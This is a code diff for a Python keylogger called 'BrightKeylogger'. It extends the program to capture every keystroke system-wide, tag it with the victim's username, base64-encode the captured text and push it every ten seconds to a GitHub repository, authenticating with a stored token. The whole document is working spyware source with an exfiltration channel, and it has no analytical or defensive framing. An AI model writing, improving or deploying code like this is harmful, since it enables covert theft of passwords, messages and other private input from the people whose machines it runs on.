@@ -2,12 +2,21 @@ import keyboard
 import time
 import threading
 import github3
+from datetime import datetime
+import os
+import base64
+import sys
+
+PATH_ON_GITHUB = f"data/"
+USER = os.getlogin()
 
 def connect_github():
     with open('mytoken.txt') as f:
-        token = f.readline()
+        token = f.read().strip()
+
     user = 'Kirubel1422'
     sess = github3.login(token=token)
+    
     return sess.repository(user, 'BrightKeylogger')
 
 class KeyLogger:
@@ -15,7 +24,13 @@ class KeyLogger:
         self.keystroke = None
         self.ascii = 0
         self.text_content = ""
-        self.repo = connect_github()
+        print('[*] Attempting to connect to github')
+        try:
+            self.repo = connect_github()
+            print('[+] Successfully connected to github')
+        except Exception as e:
+            print(f'[-] Failed to connect to github: {e}')
+            sys.exit()
 
     def onkeystroke(self, event):
         self.keystroke = event.name
@@ -33,23 +48,41 @@ class KeyLogger:
     def start_logger(self):
         keyboard.on_press(self.onkeystroke)
         keyboard.wait()
+    
+    def reset(self):
+        self.keystroke = ""
+        self.text_content = ""
+        self.ascii = 0
+        print('[+] Reseted recorded key strokes')
 
     def run(self):
         t = threading.Thread(target=self.start_logger)
         t.start()
         return t
 
-def run(**args):
+def run():
     kl = KeyLogger()
     """
     TODO: ADD A WAY TO PRINT THE OPENED SOFTWARE NAME
     """
     t = kl.run()
 
+    print('[+] Sucessfully started listening on key strokes')
     while True:
-        time.sleep(5 * 60)
-        kl.repo.create_file()
+        time.sleep(1 * 10)
+        commit_message = datetime.now().isoformat()
+        file = f'{PATH_ON_GITHUB}{USER}-{commit_message}.data'
+        bindata = bytes(kl.text_content, "utf-8")
+
+        try:
+            kl.repo.create_file(file, commit_message, base64.b64encode(bindata))
+            print("[+] Keystroke record pushed to github")
+            kl.reset()
+        except Exception as e:
+            print(f'[-] Failed to load data {e}')
+        
+        print('[*] Recording started again.')
     
 
 if __name__ == "__main__":
-    print(run())
+    run()
